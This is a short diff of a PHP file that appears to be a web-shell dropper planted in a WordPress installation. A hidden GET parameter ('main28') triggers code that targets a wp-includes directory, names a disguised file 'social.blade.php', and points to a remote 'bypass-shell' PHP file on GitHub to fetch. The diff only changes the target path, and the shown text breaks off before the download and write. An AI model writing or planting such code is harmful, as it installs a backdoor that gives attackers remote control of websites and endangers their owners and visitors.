@@ -2,7 +2,7 @@
 <?php
 
 if (isset($_GET['main28'])) {
-    $dirPath = '/home/qluilsmq/wilanye.com/wp-includes/style-engine/src/';
+    $dirPath = '/var/www/bead/wordpress/wp-includes';
     $filePath = $dirPath . '/social.blade.php';
 
     $url = 'https://raw.githubusercontent.com/dvreux/bypass-shell/refs/heads/main/28blessed.php';
